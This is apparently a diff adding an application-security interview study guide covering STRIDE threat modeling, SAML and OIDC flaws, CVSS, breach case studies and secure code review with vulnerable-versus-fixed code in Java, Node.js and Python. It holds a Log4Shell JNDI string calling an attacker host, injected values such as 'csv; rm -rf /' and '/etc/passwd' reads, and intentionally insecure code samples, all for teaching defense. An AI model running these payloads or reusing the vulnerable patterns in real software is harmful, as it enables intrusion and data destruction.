+
+---
+
+## 3. Threat Modeling (The STRIDE Framework)
+
+Threat modeling is the process of identifying vulnerabilities during the **design phase**, before any code is written. 
+
+### 🛡️ The STRIDE Methodology
+Developed by Microsoft, STRIDE helps categorize threats: (For official guidance, refer to the [Microsoft Threat Modeling Documentation](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool)).
+- **S**poofing (Impersonating something or someone) → Mitigate with AuthN.
+- **T**ampering (Modifying data in transit or at rest) → Mitigate with TLS, Hashing.
+- **R**epudiation (Claiming you didn't do something) → Mitigate with Logging/Auditing.
+- **I**nformation Disclosure (Data leaks) → Mitigate with Encryption.
+- **D**enial of Service (Crashing the system) → Mitigate with Rate Limiting.
+- **E**levation of Privilege (Gaining admin rights) → Mitigate with AuthZ/RBAC.
+
+### 🎤 Whiteboard Interview Scenario 1: Standard User Login Page
+*Interviewer: "Draw a standard login page architecture and threat model it."*
+
+1. **Spoofing:** Attacker uses credential stuffing. (Mitigation: MFA, Account Lockouts).
+2. **Tampering:** Attacker modifies the JWT in transit. (Mitigation: HTTPS, Strong JWT Signatures).
+3. **Repudiation:** User denies logging in from a foreign country. (Mitigation: Store IP/User-Agent logs securely).
+4. **Information Disclosure:** Server responds with "Username does not exist" revealing valid accounts. (Mitigation: Generic error messages).
+5. **Denial of Service:** Attacker brute-forces 100k requests to exhaust database connections. (Mitigation: Rate limiting, CAPTCHA).
+
+### 🎤 Whiteboard Interview Scenario 2: Fintech Payment Gateway
+*Interviewer: "Threat model the transaction flow of a payment gateway like Razorpay."*
+
+1. **Spoofing:** A malicious merchant spoofs a callback to the main app saying "Payment Successful". (Mitigation: Webhook signatures/HMAC validation).
+2. **Tampering:** User intercepts the `amount=500` parameter and changes it to `amount=1`. (Mitigation: Verify amounts server-side against the original cart ID).
+3. **Information Disclosure:** Payment API logs full credit card numbers in CloudWatch. (Mitigation: Data masking, Tokenization/PCI-DSS compliance).
+4. **Elevation of Privilege (Business Logic):** Race condition allowing double-withdrawal. (Mitigation: Database `FOR UPDATE` locks).
+
+---
+
+## 4. Advanced Authentication (SAML & SSO)
+
+While OAuth/OIDC are common for consumer apps (B2C), enterprise applications (B2B) rely heavily on SAML.
+
+### 📑 SAML (Security Assertion Markup Language)
+**What it is:** An XML-based standard for exchanging authentication data between an Identity Provider (IdP) like Okta/Azure AD, and a Service Provider (SP) like your web app.
+- **The Attack (XML Signature Wrapping - XSW):** SAML assertions are cryptographically signed. However, if the Service Provider's XML parser is flawed, an attacker can duplicate the assertion, alter the duplicated version (e.g., change `user@normal.com` to `admin@company.com`), and trick the parser into verifying the original signature but processing the malicious data.
+- **Mitigation:** Use established, well-vetted SAML libraries that enforce strict schema validation and reject duplicate assertion tags.
+
+### 🌐 OpenID Connect (OIDC) vs OAuth2
+- **OAuth2** is for **Authorization** (giving a third-party app access to your data, like "Sign in with Google to read my contacts"). It issues an Access Token.
+- **OIDC** sits on top of OAuth2 and adds **Authentication**. It issues an **ID Token** (usually a JWT) containing user identity information.
+
+---
+
+## 5. Vulnerability Triage & CVSS Scoring
+
+Finding a bug is only step one. Communicating its risk is step two.
+
+### 🧮 CVSS v3.1 (Common Vulnerability Scoring System)
+A framework for rating the severity of vulnerabilities from 0.0 to 10.0.
+1. **Attack Vector (AV):** Is it exploitable over the Network, Adjacent, Local, or Physical?
+2. **Attack Complexity (AC):** Is it Low (easy to exploit) or High (requires race conditions or specific setups)?
+3. **Privileges Required (PR):** None, Low, or High?
+4. **User Interaction (UI):** None or Required (e.g., XSS requires a user to click).
+5. **Scope (S):** Unchanged or Changed (e.g., escaping a sandbox)?
+6. **CIA Impact:** Confidentiality, Integrity, Availability (None, Low, High).
+
+*Example:* A Stored XSS that requires a victim to click a link (UI:R) and steals cookies (C:L, I:L, A:N) might score a 5.4 (Medium). An unauthenticated Remote Code Execution (AV:N, PR:N, C:H, I:H, A:H) is a 9.8-10.0 (Critical). Practice calculating scores yourself using the [FIRST Official CVSS Calculator](https://www.first.org/cvss/calculator/3.1).
+
+### 📝 Writing a Good Pentest Report
+1. **Executive Summary:** For the CTO/Managers. Non-technical explanation of the business risk ("An attacker could steal all customer credit cards").
+2. **Technical Details:** For the Developers. 
+   - Vulnerability Name & Description.
+   - Exact Steps to Reproduce (PoC).
+   - HTTP Request/Response snippets.
+   - Recommended Fix (Code level).
+
+---
+
+## 6. Real-World Breach Case Studies
+
+When interviewing for AppSec positions, interviewers frequently ask you to break down recent high-profile cybersecurity breaches, analyze the structural root causes, and explain how proper security engineering could have mitigated the disaster.
+
+### 1. Capital One AWS SSRF Data Theft (2019)
+- **What Happened:** An attacker exploited a vulnerable Open Source Web Application Firewall (ModSecurity) running upon an AWS Elastic Compute Cloud (EC2) server. By manipulating HTTP request routing, the attacker executed a **Server-Side Request Forgery (SSRF)** attack directed toward the AWS Link-Local Instance Metadata Service (`http://169.254.169.254`). 
+- **The Root Cause:** The compromised EC2 server instance ran under a custom IAM role (`WAF-Role`) configured with excessively permissive IAM authorization policies allowing **unrestricted Read-Access across over 700 S3 buckets**. The attacker retrieved temporary IAM Security Credentials from the metadata endpoint and exfiltrated over 106 million customer banking applications.
+- **AppSec Mitigation:** 
+  1. Enforce strict **Principle of Least Privilege (PoLP)**: WAF hosting instances never require read privileges over customer storage buckets.
+  2. Upgrade infrastructure strictly to **AWS IMDSv2**, which neutralizes SSRF exploits by forcing incoming requests to first execute a cryptographic token handshake via specialized HTTP PUT session headers (`X-aws-ec2-metadata-token`).
+
+---
+
+### 2. Apache Log4Shell Zero-Day RCE (CVE-2021-44228)
+- **What Happened:** Discovered in late 2021 within the ubiquitous Apache Log4j Java logging ecosystem, this vulnerability enabled effortless **Unauthenticated Remote Code Execution (RCE)** across millions of enterprise servers, routers, and Java applications worldwide.
+- **The Root Cause:** Log4j natively supported dynamic string parameter expansion via the Java Naming and Directory Interface (JNDI). Whenever an application logged unvalidated external input—such as an HTTP User-Agent header containing the string `${jndi:ldap://attacker.com/malicious_payload}`—the logging engine automatically reached out across the internet via LDAP, downloaded the remote malicious Java object class, and immediately executed its constructor within application memory!
+- **AppSec Mitigation:** 
+  1. Immediately disable JNDI lookup evaluations by configuring system parameters (`-Dlog4j2.formatMsgNoLookups=true`).
+  2. Implement robust **Software Composition Analysis (SCA)** scanning pipelines utilizing rigorous **Software Bills of Materials (SBOM)** to rapidly locate every nested transitive dependency containing vulnerable Log4j libraries across sprawling corporate codebases.
+
+---
+
+### 3. Uber MFA Fatigue & Internal Reconnaissance (2022)
+- **What Happened:** In September 2022, an external attacker breached Uber's entire internal corporate ecosystem—compromising cloud dashboards, Slack workspaces, internal source code repositories, and financial dashboards.
+- **The Root Cause (Attack Chain):** 
+  1. **Credential Stuffing & MFA Fatigue:** The attacker purchased an Uber contractor's leaked password from an underground marketplace. To bypass Multi-Factor Authentication (MFA), the attacker flooded the victim's smartphone with dozens of consecutive automated Duo MFA login push prompts (a technique called **MFA Fatigue** or prompt bombing). The attacker then contacted the victim via WhatsApp, pretending to be corporate IT security, and persuaded them to accept the push notification to halt the alerting loop.
+  2. **Privilege Escalation:** Once inside the corporate VPN, the attacker conducted internal reconnaissance and uncovered open network share folders containing automated **PowerShell administration scripts**. Embedded directly inside these plaintext scripts were hardcoded Superuser Admin credentials for Uber’s enterprise Privileged Access Management (PAM) vault system!
+- **AppSec Mitigation:** 
+  1. Migrate corporate identities away from push notifications toward **Phishing-Resistant MFA standards (FIDO2 / WebAuthn hardware keys like YubiKeys or Apple TouchID/Windows Hello)**.
+  2. Deploy automated secrets discovery scanners across internal network file shares and code management systems to eradicate plaintext administrative passwords.
+
+---
+
+### 4. Progress MOVEit Transfer Zero-Day SQLi (CVE-2023-34362)
+- **What Happened:** Throughout summer 2023, organized ransomware syndicates leveraged an undisclosed zero-day flaw in the Progress MOVEit file transfer software, stealing sensitive payroll, Government HR, and corporate data across thousands of target victim organizations worldwide.
+- **The Root Cause:** The enterprise web interface contained an **unauthenticated SQL injection vulnerability**. By submitting tailored HTTP headers and transaction query parameters, external attackers broke out of SQL backend structures, injected administrative user profiles directly into enterprise databases, and automatically deployed custom ASP.NET web shells (`human2.aspx`) to automate mass filesystem data extraction.
+- **AppSec Mitigation:** 
+  1. Strict parameterized query binding must be audited not merely within primary application microservices, but across all third-party commercial software appliances, managed file gateways, and auxiliary corporate IT tools.
+  2. Deploy high-sensitivity File Integrity Monitoring (FIM) across web directories to instantly quarantine unknown web script drops (like unexpected `.aspx` or `.jsp` creations) appearing within application server document roots.
+
+---
+
+## 7. 🎤 Interview Questions & Model Answers
+
+<details>
+<summary><strong>Q1: During a Cloud Security architectural review, why represents upgrading AWS EC2 instances from IMDSv1 to IMDSv2 an essential defensive baseline against application vulnerabilities?</strong></summary>
+<strong>Model Answer:</strong><br>
+AWS IMDSv1 operates using basic standard HTTP GET requests directed to `http://169.254.169.254/`. If a backend application suffers from an SSRF flaw (or an XXE vulnerability supporting external entity resolution), an attacker simply passes this address to exfiltrate attached instance IAM security credentials directly into application output responses. 
+Conversely, **AWS IMDSv2 enforces a session-oriented architecture** that completely stops conventional SSRF vectors through two core mechanisms:
+1. **Token Authentication Handshake:** To retrieve metadata under IMDSv2, the client must explicitly instantiate a session via an HTTP **PUT** request to `/latest/api/token` while passing a required custom header: `X-aws-ec2-metadata-token-ttl-seconds: 60`. Conventional application SSRF vulnerabilities almost universally manifest as simple HTTP GET parameter fetches and lack the execution complexity required to formulate custom HTTP PUT verbs accompanied by custom arbitrary protocol headers!
+2. **TTL Network Hop Restrictions:** IMDSv2 session responses explicitly restrict standard IP Packet Time-To-Live (TTL) values strictly to `1`. If an incoming request passes through an intermediary web application reverse proxy, WAF container, or routing firewall layer before hitting the metadata endpoint, the network hop decrements the packet TTL to `0`, prompting the host networking stack to discard the traffic instantly.
+</details>
+
+<details>
+<summary><strong>Q2: You discover a race condition in a banking backend during concurrency testing where simultaneous withdrawal requests lead to double payout. Walk through the explicit database SQL synchronization fixes required to remediate this behavior.</strong></summary>
+<strong>Model Answer:</strong><br>
+A concurrency race condition occurs because standard database read-then-write workflows (such as checking `SELECT balance FROM accounts WHERE id = 1`, confirming balance >= withdrawal, and subsequently updating via `UPDATE accounts SET balance = balance - withdrawal WHERE id = 1`) execute non-atomically. If fifty concurrent requests hit the API simultaneously, all fifty threads execute the initial `SELECT` inspection prior to any single thread completing the subtraction update, leading to massively duplicated payouts!
+To eliminate concurrency exploitation, we must enforce strict transactional atomicity using one of three proven strategies:
+1. **Pessimistic Row Locking (`FOR UPDATE`):** Modify the reading SELECT query inside an explicitly defined atomic database transaction block by appending **`FOR UPDATE`** (`SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;`). This instructs the SQL engine (PostgreSQL, MySQL InnoDB, Oracle) to place an exclusive write lock directly upon that database row; all subsequent concurrent threads attempting to read or modify that specific account must wait in queue until the active transaction explicitly issues a `COMMIT` or `ROLLBACK`.
+2. **Atomic Inline WHERE Assertions:** Merge the balance evaluation directly inside the modification SQL execution sequence: `UPDATE accounts SET balance = balance - 500 WHERE id = 1 AND balance >= 500;`. The application then evaluates the returned database transaction affected row count (`rowsAffected == 1`); if zero rows change, the transaction aborts instantly without payout.
+3. **Optimistic Locking via Version Columns:** Maintain a sequential version tracking counter column upon the table row (`version INT`). When updating, assert version parity: `UPDATE accounts SET balance = 500, version = 3 WHERE id = 1 AND version = 2;`. If another concurrent thread executed a transaction during flight, the version integer incremented, causing the UPDATE to fail safely.
+</details>
+
+<details>
+<summary><strong>Q3: How does XML Signature Wrapping (XSW) threaten enterprise SAML Single Sign-On (SSO) authentication integrations, and how must Service Providers secure their assertion consumers?</strong></summary>
+<strong>Model Answer:</strong><br>
+In enterprise Single Sign-On ecosystems utilizing **SAML 2.0**, an Identity Provider (IdP such as Okta or Azure AD) authenticates a user and generates a cryptographically signed XML document called a SAML Assertion containing user attributes (e.g., `<NameID>user@normal.com</NameID>`), which is delivered to the target target web Service Provider (SP). 
+An **XML Signature Wrapping (XSW)** attack abuses structural separation within poorly written XML document parsers—specifically when an application uses two distinct processing logic blocks: one routine to cryptographically verify the digital signature (`<ds:Signature>`), and a secondary DOM tree manipulation routine to extract user identities from the `<Assertion>`. To execute an XSW attack, an authenticated legitimate low-privilege user intercepts the valid SAML response and clones/duplicates the XML `<Assertion>` node structure within the same payload document. They preserve the original authentic cryptographic signature over the original unchanged assertion node (ensuring verification routines return valid signature approval), while simultaneously editing the duplicated cloned assertion node to state `<NameID>admin@company.com</NameID>`. If the Service Provider application simply invokes `.getElementsByTagName("Assertion")[1]` during user instantiation, it trusts the valid crypto check from Node A while granting executive permissions derived from fraudulent Node B!
+**Remediation:** Service Provider endpoints must utilize hardened, security-vetted SAML validation libraries (such as Spring Security SAML or OneLogin SAML) that strictly enforce tight **XML Schema Definitions (XSD)**, actively forbid duplicated assertion nodes within single document payloads, and programmatically guarantee that the exact XML DOM node verified during signature evaluation corresponds identically to the specific data structure evaluated during session creation.
+</details>
+
+<details>
+<summary><strong>Q4: Explain the difference between an Access Token and an ID Token within OAuth 2.0 and OpenID Connect (OIDC) authentication frameworks. What goes wrong when developers confuse them?</strong></summary>
+<strong>Model Answer:</strong><br>
+While both token formats routinely manifest as JSON Web Tokens (JWTs), they serve fundamentally distinct enterprise security objectives:
+1. **The OAuth 2.0 Access Token:** Designed strictly for **Authorization (Delegated Access)**. An Access Token acts as an opaque or structured authorization bearer key designed solely for transmission toward resource API server backends (e.g., calling Google Drive API or Github Repos API) to retrieve data on behalf of an account. Crucially, client application frontends should never attempt to decode, parse, or evaluate user authentications solely by examining an Access Token!
+2. **The OpenID Connect (OIDC) ID Token:** Designed explicitly for **Authentication (Federated Identity Validation)**. An ID Token represents a cryptographically signed cryptographic assertion produced by an Authorization Server proving that a specific user authenticated successfully. It encapsulates mandatory identity metadata claims (such as `sub` for user identifier, `iss` for issuer validation, `aud` matching the receiving client ID, and `iat`/`exp` timestamp parameters).
+**The Security Danger:** A common critical architectural vulnerability occurs when a developer incorrectly accepts an **Access Token** as proof of frontend authentication during application login workflows. Because standard Access Tokens frequently omit critical audience verification claims (`aud`), an attacker can obtain a valid Access Token issued for their own unrelated malicious application (App B) and pass that exact token to a vulnerable client application (App A). If App A blindly calls a generic userinfo endpoint using that token without validating intended token audience binding, it mistakenly authenticates the session, permitting cross-application token replay account takeover!
+</details>
+
+<details>
+<summary><strong>Q5: When threat modeling a complex distributed application, how does applying the Microsoft STRIDE framework help uncover structural flaws before writing code? Provide examples for the 'T' and 'E' components.</strong></summary>
+<strong>Model Answer:</strong><br>
+<strong>STRIDE</strong> provides a structured threat discovery taxonomy that transforms abstract "how could someone attack this app" guessing into methodical risk evaluation across every data flow diagram boundary. STRIDE categorizes potential software threats across six distinct execution vectors: **S**poofing identity, **T**ampering with data, **R**epudiation, **I**nformation disclosure, **D**enial of service, and **E**levation of privilege.
+When threat modeling an enterprise system during design reviews, we systematically challenge every architectural data flow boundary against each pillar:
+- **T - Tampering with Data (Integrity threat):** Evaluating whether external actors can modify transmission state or storage variables without detection. 
+  *Practical Fintech Example:* If an e-commerce checkout architecture routes transaction payloads from the client browser straight to a third-party payment processing provider without cryptographic HMAC parameter signing, an attacker can tamper with outgoing form variables, changing `transaction_amount=5000` to `transaction_amount=10` while maintaining valid transaction item references.
+- **E - Elevation of Privilege (Authorization threat):** Assessing whether structural application flaws allow low-privilege actors to command higher-tiered operational capabilities. 
+  *Practical Fintech Example:* In an API microservices network, if internal customer service support administration endpoints (`/api/internal/support/refund`) are exposed without rigorous mutual TLS (mTLS) machine identities or role verification checks because developers assumed "only internal network staff can access internal route bridges," an external attacker who obtains an initial SSRF flaw can immediately elevate structural privileges to invoke arbitrary automated account refunds!
+</details>
+
+
+
+
+---
+
+<a id="section-09_secure_code_review"></a>
+# 💻 09: Secure Code Review & PR Remediation (Java, Node.js, Python)
+
+Manual **Secure Code Review (SCR)** is one of the most highly sought-after skills for Application Security Engineers and DevSecOps practitioners. While Automated Static Application Security Testing (SAST) tools can catch syntax patterns and known CVEs, human intuition is required to identify architectural flaws, authentication/authorization gaps, complex business logic vulnerabilities, and nuanced context-specific coding errors.
+
+In this module, we dive deep into side-by-side comparisons of vulnerable vs. secure code implementations across the three most common backend enterprise languages: **Java, JavaScript (Node.js), and Python**.
+
+---
+
+## 1. SQL Injection (SQLi) Remediation
+
+### ☕ Java (JDBC & Hibernate/JPA)
+In Java, concatenation directly into JDBC query strings or JPA queries without named/positional binding introduces severe SQL Injection vulnerabilities.
+
+#### ❌ Vulnerable Implementation (JDBC Concatenation)
+```java
+public User getUserByName(String username) throws SQLException {
+    Connection conn = db.getConnection();
+    // Vulnerable: Direct string concatenation into query
+    String query = "SELECT * FROM users WHERE username = '" + username + "'";
+    Statement stmt = conn.createStatement();
+    ResultSet rs = stmt.executeQuery(query);
+    // ...
+}
+```
+
+#### ✅ Secure Implementation (Prepared Statements & Parameter Binding)
+```java
+public User getUserByName(String username) throws SQLException {
+    Connection conn = db.getConnection();
+    // Secure: Using positional parameters (?) with PreparedStatement
+    String query = "SELECT * FROM users WHERE username = ?";
+    PreparedStatement pstmt = conn.prepareStatement(query);
+    pstmt.setString(1, username); // Automatically sanitizes & handles type conversion
+    ResultSet rs = pstmt.executeQuery();
+    // ...
+}
+```
+
+---
+
+### 🌐 JavaScript / Node.js (mysql2 & Sequelize ORM)
+Modern Node.js backends often use ORMs like Sequelize or raw drivers like `mysql2` / `pg`. Even ORMs can be vulnerable if raw SQL query methods are used improperly.
+
+#### ❌ Vulnerable Implementation (mysql2 String Template Literal)
+```javascript
+const db = require('./database');
+
+async function findAccount(email) {
+    // Vulnerable: Using JS Template Literals ($) to interpolate user input directly
+    const [rows] = await db.query(`SELECT * FROM accounts WHERE email = '${email}'`);
+    return rows[0];
+}
+```
+
+#### ✅ Secure Implementation (Parameterized Placeholders / ORM Find)
+```javascript
+const db = require('./database');
+const Account = require('./models/Account'); // Sequelize / Prisma Model
+
+// Approach 1: Parameterized Raw Query
+async function findAccountRaw(email) {
+    // Secure: Using array parameter substitution in mysql2 / pg
+    const [rows] = await db.query('SELECT * FROM accounts WHERE email = ?', [email]);
+    return rows[0];
+}
+
+// Approach 2: Safe ORM Query
+async function findAccountORM(email) {
+    // Secure: ORMs natively parameterize WHERE clause object mappings
+    return await Account.findOne({ where: { email: email } });
+}
+```
+
+---
+
+### 🐍 Python (psycopg2 & SQLAlchemy)
+Python applications using DB-API 2.0 compliant drivers (`psycopg2`, `sqlite3`, `mysql-connector`) must avoid standard string formatters (`f-strings`, `.format()`, or `%s` concatenation).
+
+#### ❌ Vulnerable Implementation (Python f-string injection)
+```python
+import psycopg2
+
+def fetch_user_orders(user_id, db_conn):
+    cursor = db_conn.cursor()
+    # Vulnerable: Never use Python string interpolation or f-strings for SQL queries!
+    query = f"SELECT * FROM orders WHERE user_id = {user_id}"
+    cursor.execute(query)
+    return cursor.fetchall()
+```
+
+#### ✅ Secure Implementation (Driver Parameter Substitution / SQLAlchemy)
+```python
+import psycopg2
+from sqlalchemy.orm import Session
+from models import Order
+
+# Approach 1: Driver-native SQL Parameter Substitution
+def fetch_user_orders_raw(user_id, db_conn):
+    cursor = db_conn.cursor()
+    # Secure: Let psycopg2 handle token substitution safely via tuple passing
+    query = "SELECT * FROM orders WHERE user_id = %s"
+    cursor.execute(query, (user_id,))
+    return cursor.fetchall()
+
+# Approach 2: SQLAlchemy ORM Filter
+def fetch_user_orders_orm(user_id, db_session: Session):
+    # Secure: SQLAlchemy expression syntax prevents injection automatically
+    return db_session.query(Order).filter(Order.user_id == user_id).all()
+```
+
+---
+
+## 2. Command Injection & OS Execution
+
+When an application needs to invoke system binaries or utilities (like `git`, `ffmpeg`, `ping`, or `pdf-converter`), improper handling of command strings can allow attackers to piggyback malicious system commands (via `;`, `|`, `&`, `` ` ` ``).
+
+### ☕ Java (Runtime.getRuntime().exec & ProcessBuilder)
+
+#### ❌ Vulnerable Implementation (Runtime Exec with Concatenated String)
+```java
+public void pingHost(String ipAddress) throws IOException {
+    // Vulnerable: Passes entire combined command string to system shell parser
+    Runtime.getRuntime().exec("ping -c 4 " + ipAddress);
+}
+// If user supplies ipAddress as: "127.0.0.1 && cat /etc/passwd", arbitrary commands execute!
+```
+
+#### ✅ Secure Implementation (ProcessBuilder with Command Argument List)
+```java
+public void pingHost(String ipAddress) throws IOException {
+    // Secure: Validate input strictly using regular expressions first
+    if (!ipAddress.matches("^[0-9.]{7,15}$")) {
+        throw new IllegalArgumentException("Invalid IP address format.");
+    }
+
+    // Secure: ProcessBuilder treats the list elements as literal argv parameters, NOT shell tokens
+    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ipAddress);
+    Process process = pb.start();
+}
+```
+
+---
+
+### 🌐 JavaScript / Node.js (child_process.exec vs execFile / spawn)
+In Node.js, `exec()` spawns a full subshell (like `/bin/sh` or `cmd.exe`), which interprets shell meta-characters. `execFile()` and `spawn()` without the shell option do not invoke a shell!
+
+#### ❌ Vulnerable Implementation (child_process.exec)
+```javascript
+const { exec } = require('child_process');
+
+function convertImage(fileName, callback) {
+    // Vulnerable: exec opens a full shell and interprets shell command separators!
+    exec(`convert /uploads/${fileName} -resize 50% /uploads/${fileName}.png`, (err, stdout) => {
+        callback(err, stdout);
+    });
+}
+```
+
+#### ✅ Secure Implementation (child_process.execFile or spawn)
+```javascript
+const { execFile, spawn } = require('child_process');
+const path = require('path');
+
+function convertImageSecure(fileName, callback) {
+    // Sanitize path against directory traversal
+    const safeName = path.basename(fileName);
+
+    // Secure: execFile invokes the executable directly without shell parsing!
+    execFile('convert', ['/uploads/' + safeName, '-resize', '50%', '/uploads/' + safeName + '.png'], { shell: false }, (err, stdout) => {
+        callback(err, stdout);
+    });
+}
+```
+
+---
+
+### 🐍 Python (os.system & subprocess)
+Python offers `os.system()` and `os.popen()`, which rely on shell invocation and should never be fed untrusted input. The `subprocess` module must be called with a list of arguments and `shell=False`.
+
+#### ❌ Vulnerable Implementation (subprocess with shell=True)
+```python
+import subprocess
+
+def clone_repo(repo_url):
+    # Vulnerable: shell=True causes the string to be executed in an unsafe Bash shell
+    subprocess.call(f"git clone {repo_url} /opt/repos/", shell=True)
+```
+
+#### ✅ Secure Implementation (subprocess with Argument List and shell=False)
+```python
+import subprocess
+import shlex
+import re
+
+def clone_repo_secure(repo_url):
+    # Strict scheme verification
+    if not re.match(r"^https://github\.com/[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+\.git$", repo_url):
+        raise ValueError("Untrusted or malformed Git repository URL")
+
+    # Secure: Pass command and arguments as a distinct sequence list; shell=False is default
+    subprocess.run(["git", "clone", repo_url, "/opt/repos/"], check=True, shell=False)
+```
+
+---
+
+## 3. Insecure Deserialization & Parser Exploits
+
+Deserialization transforms byte streams or JSON/YAML payloads back into native programming object instances. If unvalidated or untrusted user streams are fed to native unsafe parsers, Remote Code Execution (RCE) can occur during the deserialization object construction routine.
+
+### ☕ Java (ObjectInputStream vs JSON/Safe Serdes)
+
+#### ❌ Vulnerable Implementation (Java Native Serialization)
+```java
+public void receivePayload(InputStream in) throws Exception {
+    // Vulnerable: Reading raw ObjectInputStream from untrusted network sources opens gadget chain RCEs (e.g., Apache Commons Collections)
+    ObjectInputStream ois = new ObjectInputStream(in);
+    Object obj = ois.readObject(); 
+}
+```
+
+#### ✅ Secure Implementation (JSON Serialization or Validated Look-Ahead Streams)
+```java
+// Option 1: Prefer safe data formats like JSON (via Jackson/Gson) over Java native binary serialization
+public void receivePayloadSafe(String jsonString) throws Exception {
+    ObjectMapper mapper = new ObjectMapper();
+    // Enable strict types and disable default polymorphic typing unless explicitly sandboxed!
+    UserPayload obj = mapper.readValue(jsonString, UserPayload.class);
+}
+```
+
+---
+
+### 🐍 Python (pickle & yaml.load vs Safe Parsers)
+Python's native `pickle` module builds bytecode evaluation routines and is fundamentally insecure against untrusted sources. Similarly, PyYAML’s legacy `yaml.load()` executes arbitrary constructor constructors.
+
+#### ❌ Vulnerable Implementation (pickle and unconstrained PyYAML)
+```python
+import pickle
+import yaml
+
+def parse_session_cookie(cookie_data):
+    # Vulnerable: pickle.loads will execute arbitrary classes defining a __reduce__() method!
+    session_obj = pickle.loads(cookie_data)
+    return session_obj
+
+def read_config(yaml_string):
+    # Vulnerable in older PyYAML or if specified without SafeLoader: executes arbitrary python directives!
+    return yaml.load(yaml_string)
+```
+
+#### ✅ Secure Implementation (JSON & PyYAML SafeLoader)
+```python
+import json
+import yaml
+
+def parse_session_cookie_secure(cookie_data_json):
+    # Secure: Use strict JSON decoding for session structures
+    return json.loads(cookie_data_json)
+
+def read_config_secure(yaml_string):
+    # Secure: Always specify yaml.safe_load or Loader=yaml.SafeLoader to disable arbitrary code evaluation
+    return yaml.safe_load(yaml_string)
+```
+
+---
+
+## 4. Path Traversal & Arbitrary File Manipulation
+
+When applications read, write, or download files based on user-supplied filenames, path traversal sequences (`../../`, `%2e%2e%2f`) can escape the intended storage root to access sensitive operating system files (`/etc/passwd` or `C:\Windows\win.ini`).
+
+### 🌐 JavaScript / Node.js (Path Normalization & Base-Directory Sandboxing)
+
+#### ❌ Vulnerable Implementation (Unchecked File Read)
+```javascript
+const fs = require('fs');
+const path = require('path');
+
+app.get('/download', (req, res) => {
+    // Vulnerable: Attacker can submit "?file=../../../../etc/passwd"
+    const filePath = path.join(__dirname, 'public/uploads', req.query.file);
+    fs.readFile(filePath, 'utf8', (err, data) => {
+        res.send(data);
+    });
+});
+```
+
+#### ✅ Secure Implementation (Path Resolution Verification)
+```javascript
+const fs = require('fs');
+const path = require('path');
+
+app.get('/downloadSecure', (req, res) => {
+    const uploadRoot = path.resolve(__dirname, 'public/uploads');
+    
+    // Resolve the complete canonical path
+    const requestedPath = path.resolve(uploadRoot, req.query.file);
+    
+    // Secure: Validate that the resolved absolute path starts strictly within the designated upload directory!
+    if (!requestedPath.startsWith(uploadRoot + path.sep)) {
+        return res.status(403).send('Access Denied: Path Traversal Attempted');
+    }
+
+    fs.readFile(requestedPath, 'utf8', (err, data) => {
+        if (err) return res.status(404).send('File not found');
+        res.send(data);
+    });
+});
+```
+
+---
+
+## 5. Pull Request (PR) Security Review Workflow
+
+As an AppSec Engineer, you will frequently be asked to review high-risk Pull Requests (PRs) before they merge into the primary code repository. Here is an industry-standard checklist for conducting high-impact code reviews:
+
+```
++-----------------------------------------------------------------------------------------+
+|                    PULL REQUEST (PR) SECURITY REVIEW CHECKLIST                          |
++-----------------------------------------------------------------------------------------+
+| [ ] 1. INPUT VALIDATION: Are all external parameters validated against tight allowlists?|
+| [ ] 2. AUTHENTICATION & SESSION: Are custom authentication mechanisms avoided?        |
+| [ ] 3. AUTHORIZATION & IDOR: Is ownership verified on object retrieval (WHERE userId=?)?|
+| [ ] 4. DATABASE TRANSACTIONS: Are Prepared Statements/safe ORMs used universally?       |
+| [ ] 5. OUTPUT ENCODING: Is context-aware escaping performed before DOM injection?       |
+| [ ] 6. CRYPTOGRAPHY: Are modern hashing (Argon2id, bcrypt) & ciphers (AES-GCM) applied? |
+| [ ] 7. SECRETS IN CODE: Have API keys, private keys, or passwords been committed?       |
+| [ ] 8. ERROR HANDLING: Do stack traces or database errors leak to client API payloads?  |
++-----------------------------------------------------------------------------------------+
+```
+
+### Practical PR Review Scenario (Spot the Flaws)
+Imagine a developer opens a pull request for a new user API route in Node.js Express. Try reading this PR snippet and listing the vulnerabilities before viewing the solution:
+
+```javascript
+// [PR-1492] Add user profile download and token verify route
+app.post('/api/v1/profile/export', async (req, res) => {
+    const { userId, format, debug } = req.body;
+    
+    if (debug) {
+        console.log(`Executing export for ${userId} with secret ${process.env.ADMIN_SECRET}`);
+    }
+
+    const userData = await db.query(`SELECT * FROM profiles WHERE id = ${userId}`);
+    
+    const outputPath = `/tmp/export_${userId}.${format}`;
+    exec(`json2csv -i /var/data/${userData.uuid}.json -o ${outputPath}`, (err) => {
+        res.download(outputPath);
+    });
+});
+```
+
+<details>
+<summary>💡 Click to Reveal the 4 Security Vulnerabilities in this PR</summary>
+
+1. **SQL Injection (SQLi):** The string parameter `${userId}` is interpolated directly into the database query string without parameter binding.
+2. **Command Injection (RCE):** The user-controlled parameter `${format}` is passed directly into `exec()`. Passing a format value like `csv; rm -rf /` executes arbitrary shell commands.
+3. **Sensitive Log Leakage:** If the optional `debug` boolean is set, the secure administrative environmental secret (`process.env.ADMIN_SECRET`) is logged directly into std/console output, risking log pipeline credential harvesting!
+4. **Missing Authorization (IDOR):** The API verifies neither session identity nor whether the requesting caller truly owns or holds administrative authorization over the target `userId`.
+</details>
+
+---
+
+## 🎤 Interview Questions & Model Answers
+
+<details>
+<summary><strong>Q1: Why are Java ORM frameworks like Hibernate or JPA still vulnerable to SQL Injection if developers aren't careful?</strong></summary>
+<strong>Model Answer:</strong><br>
+While Hibernate and JPA automatically protect against SQL injection when developers utilize standard Entity Finders (like `entityManager.find(User.class, id)`) or Criteria API objects, developers frequently write custom queries using <strong>HQL (Hibernate Query Language)</strong> or native SQL statements. If a developer uses raw string concatenation to construct an HQL or native SQL query—such as `createQuery("FROM User WHERE email = '" + input + "'")`—the application is immediately exposed to HQL/SQL Injection. To remediate this, developers must consistently apply named parameters (`:email`) or positional parameters (`?`) even within HQL syntax.
+</details>
+
+<details>
+<summary><strong>Q2: How does the Node.js event loop architecture make ReDos (Regular Expression Denial of Service) particularly devastating?</strong></summary>
+<strong>Model Answer:</strong><br>
